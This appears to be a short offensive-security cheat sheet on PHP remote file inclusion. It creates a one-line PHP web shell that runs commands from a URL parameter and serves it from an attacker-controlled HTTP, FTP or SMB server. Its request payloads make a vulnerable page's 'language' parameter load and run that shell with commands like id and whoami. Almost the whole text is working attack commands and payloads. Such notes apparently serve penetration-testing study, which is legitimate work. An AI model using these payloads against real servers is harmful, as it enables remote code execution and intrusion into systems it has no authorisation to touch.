
Requirements for method to work
```
allow_url_include in php.ini
```

Create php page
```shell-session
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

### HTTP method
Start call back server
```shell-session
sudo python3 -m http.server <LISTENING_PORT>
```

Execution payload
```http
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

### FTP method
Start ftp server
```shell-session
sudo python -m pyftpdlib -p 21
```

Execution payload
```http
http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id
```

### SMB Method

Start SMB server
```shell-session
impacket-smbserver -smb2support share $(pwd)
```

Execution payload
```http
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

